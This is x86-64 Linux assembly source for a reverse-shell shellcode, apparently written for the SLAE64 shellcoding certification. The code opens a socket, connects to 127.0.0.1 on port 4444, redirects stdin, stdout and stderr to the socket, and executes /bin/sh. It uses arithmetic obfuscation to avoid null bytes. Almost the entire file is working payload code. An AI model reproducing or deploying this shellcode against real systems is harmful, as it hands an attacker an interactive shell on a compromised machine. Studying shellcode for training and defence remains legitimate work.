; This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification :
; http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
;
; Author : SLAE64-PA-6470 (kahlon81)
; Date : 2018/02/21
;
; nasm -f elf64 Reverse-Shell-Safe.nasm -o Reverse-Shell-Safe.o
; ld Reverse-Shell-Safe.o -o Reverse-Shell-Safe

global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	xor rax, rax
	add al, 41
	
	xor rdi, rdi
	inc dil
	inc dil

	xor rsi, rsi
	inc sil	

	xor rdx, rdx
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax
	
	;mov dword [rsp-4], 0x0100007f
	mov dword [rsp -4], 0x9A999A18
	sub dword [rsp -4], 0x99999999

	mov word [rsp-6], 0x5c11
	
	;mov word [rsp-8], 0x2
        mov word [rsp-8], 0x1FF
        sub word [rsp-8], 0x1FD

	sub rsp, 8


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	xor rax, rax
	add al, 42

	mov rsi, rsp
	
	xor rdx, rdx
	add dl, 16	

	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
	xor rax, rax
	add al, 33

        xor rsi, rsi
	syscall

        xor rax, rax
	add al, 33

        xor rsi, rsi
	inc sil

	syscall

        xor rax, rax
	add al, 33

        xor rsi, rsi
	inc sil
	inc sil	

	syscall


        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp

        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
 

